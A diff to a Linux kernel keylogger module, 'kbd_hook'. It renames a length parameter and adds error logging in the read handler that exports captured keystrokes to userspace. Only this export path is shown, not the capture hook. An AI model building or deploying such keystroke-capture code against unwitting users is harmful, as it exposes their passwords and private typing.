@@ -92,7 +92,7 @@ static void get_key_name(unsigned int scancode, char *buf) {
   *(buf + 1) = 0;
 }
 
-static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t len,
+static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t ulen,
                              loff_t *off) {
   if (*off) {
     return 0;
@@ -108,6 +108,7 @@ static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t len,
   char *kbuf = kmalloc(keylog_count * LOG_ENTRY_SIZE, GFP_ATOMIC);
   if (!kbuf) {
     spin_unlock_irqrestore(&spinlock, flags);
+    printk(KERN_ERR "kbd_hook: failed to allocate memoty for keylogs\n");
     return -ENOMEM;
   }
 
@@ -134,11 +135,12 @@ static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t len,
 
   spin_unlock_irqrestore(&spinlock, flags);
 
-  if (formatted_len > len) {
-    formatted_len = len;
+  if (formatted_len > ulen) {
+    formatted_len = ulen;
   }
 
   if (copy_to_user(ubuf, kbuf, formatted_len)) {
+    printk(KERN_ERR "kbd_hook: failed to copy keylogs to userspace\n");
     kfree(kbuf);
     return -EFAULT;
   }
